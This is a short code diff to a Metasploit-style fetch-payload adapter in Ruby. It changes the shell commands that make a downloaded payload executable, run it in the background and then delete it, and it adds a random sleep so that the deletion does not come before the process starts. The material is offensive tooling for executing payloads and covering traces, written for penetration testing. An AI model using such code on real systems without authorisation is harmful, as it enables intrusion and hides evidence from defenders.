@@ -202,12 +202,14 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix
-    cmds = "; chmod +x #{_remote_destination_nix}"
+    cmds = ";chmod +x #{_remote_destination_nix}"
     if datastore['FETCH_DELETE']
-      cmds << "; (#{_remote_destination_nix} &)"
-      cmds << ";rm -rf #{_remote_destination_nix}"
+      # sometimes the delete can happen before the process is created
+      sleep_delete = rand(2..7)
+      cmds << ";(#{_remote_destination_nix} &)"
+      cmds << ";sleep #{sleep_delete};rm -rf #{_remote_destination_nix}"
     else
-      cmds << "; #{_remote_destination_nix} &"
+      cmds << ";#{_remote_destination_nix} &"
     end
     cmds
   end
